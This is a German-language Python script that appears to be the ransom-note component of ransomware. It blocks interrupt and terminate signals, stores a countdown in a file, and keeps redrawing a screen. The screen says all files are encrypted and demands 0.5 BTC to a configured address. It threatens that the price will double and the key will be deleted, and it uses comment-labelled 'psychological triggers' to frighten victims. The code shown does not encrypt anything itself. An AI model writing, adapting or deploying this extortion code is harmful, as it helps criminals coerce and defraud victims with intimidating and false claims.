import os
import time
import signal
from datetime import datetime, timedelta

# Terminal-Design
RED = "\033[91m"
BOLD = "\033[1m"
RESET = "\033[0m"
CLEAR = "cls" if os.name == "nt" else "clear"

from config import Config

BTC_ADDRESS = Config.BTC_ADDRESS
CONTACT_EMAIL = Config.CONTACT_EMAIL
COUNTDOWN_HOURS = Config.COUNTDOWN_HOURS
TIMER_FILE = Config.TIMER_FILE

# Schutz vor Schließen
def block_exit(signum, frame):
    print(RED + "\n[!] Diese Aktion ist blockiert. Das Fenster darf nicht geschlossen werden." + RESET)
signal.signal(signal.SIGINT, block_exit)
signal.signal(signal.SIGTERM, block_exit)

# Timer initialisieren
if os.path.exists(TIMER_FILE):
    with open(TIMER_FILE, "r") as f:
        end_time = datetime.fromisoformat(f.read().strip())
else:
    end_time = datetime.now() + timedelta(hours=COUNTDOWN_HOURS)
    with open(TIMER_FILE, "w") as f:
        f.write(end_time.isoformat())

def get_remaining_time():
    delta = end_time - datetime.now()
    if delta.total_seconds() <= 0:
        return None
    hours, rem = divmod(int(delta.total_seconds()), 3600)
    minutes, seconds = divmod(rem, 60)
    return f"{hours:02}:{minutes:02}:{seconds:02}"

def draw_screen():
    os.system(CLEAR)
    print()
    print(RED + BOLD + "!!! ALLE DATEIEN AUF DIESEM SYSTEM WURDEN VERSCHLÜSSELT !!!".center(80) + RESET)
    print()
    print(RED + BOLD + "WAS IST PASSIERT?".center(80) + RESET)
    print("Alle Ihre persönlichen, geschäftlichen und vertraulichen Dateien wurden mit militärischer Verschlüsselung (AES-256 + RSA-2048) gesperrt.")
    print("Ohne den privaten Schlüssel, den nur wir besitzen, sind Ihre Daten für immer verloren.")
    print()
    print(RED + BOLD + "WIE KÖNNEN SIE IHRE DATEIEN RETTEN?".center(80) + RESET)
    print("Um Ihre Dateien zu entschlüsseln, müssen Sie eine Zahlung in Bitcoin leisten.")
    print("Nur so erhalten Sie den Entschlüsselungsschlüssel und retten Ihre Erinnerungen, Projekte und Arbeit.")
    print()
    print(RED + "Betrag:     " + BOLD + "0.5 BTC" + RESET)
    print(RED + "Adresse:    " + BOLD + BTC_ADDRESS + RESET)
    print(RED + "Kontakt:    " + BOLD + CONTACT_EMAIL + RESET)
    print()
    print("Nach Zahlung erhalten Sie ein Entschlüsselungsprogramm. Sie können dann alle Ihre Dateien wiederherstellen.")
    print()
    print(RED + BOLD + "WAS PASSIERT, WENN SIE NICHT ZAHLEN?".center(80) + RESET)
    print("1. Nach Ablauf der Frist verdoppelt sich der Preis (1 BTC).")
    print("2. Nach weiteren 24 Stunden wird der Entschlüsselungsschlüssel unwiderruflich gelöscht.")
    print("3. Sie verlieren den Zugriff auf Ihre Fotos, Dokumente, Projekte und Erinnerungen für immer.")
    print("4. Niemand – auch IT-Experten oder Polizei – kann Ihre Daten wiederherstellen.")
    print()
    print(RED + BOLD + "ACHTUNG: JEDER FEHLVERSUCH KANN ALLES VERSCHLIMMERN!".center(80) + RESET)
    print("- Jeder Versuch, das Programm zu beenden, den Computer neu zu starten oder Sicherheitssoftware auszuführen, kann zum sofortigen Verlust aller Daten führen.")
    print("- Diese Software erkennt Manipulationsversuche und reagiert automatisch.")
    print("- Denken Sie an Ihre Familie, Ihre Arbeit, Ihre Erinnerungen. Handeln Sie rechtzeitig.")
    print()
    print(RED + BOLD + "SIE SIND NICHT ALLEIN – WIR BEANTWORTEN IHRE FRAGEN AN: ".center(80) + RESET)
    print(CONTACT_EMAIL.center(80))
    print()
    # Psychologische Trigger
    print(RED + BOLD + "STELLEN SIE SICH VOR: ".center(80) + RESET)
    print("Wie würden Sie sich fühlen, wenn alle Ihre Fotos, Projekte und Erinnerungen für immer verloren wären?")
    print("Was wäre, wenn Sie nie wieder auf Ihre wichtigsten Dokumente zugreifen könnten?")
    print("Verlieren Sie keine Zeit – jede Minute zählt für Ihre Daten!")
    print()
    # TIMER
    remaining = get_remaining_time()
    print(RED + BOLD + "=" * 80)
    if remaining:
        print("VERBLEIBENDE ZEIT BIS PREISVERDOPPLUNG:".center(80))
        print()
        print("█" * 80)
        print(f"⏳ {remaining}".center(80))
        print("█" * 80)
        print(RED + BOLD + f"\n{remaining} bis Ihre Daten für IMMER verloren sind!".center(80) + RESET)
    else:
        print("⛔ ZEIT ABGELAUFEN – DER ENTSCHLÜSSELUNGSSCHLÜSSEL WURDE GELÖSCHT".center(80))
        print(RED + BOLD + "ALLE IHRE DATEIEN SIND JETZT UNWIDERRUFLICH VERLOREN.".center(80) + RESET)
    print("=" * 80 + RESET)
    print()

def main():
    while True:
        draw_screen()
        if not get_remaining_time():
            break
        time.sleep(1)

if __name__ == "__main__":
    main()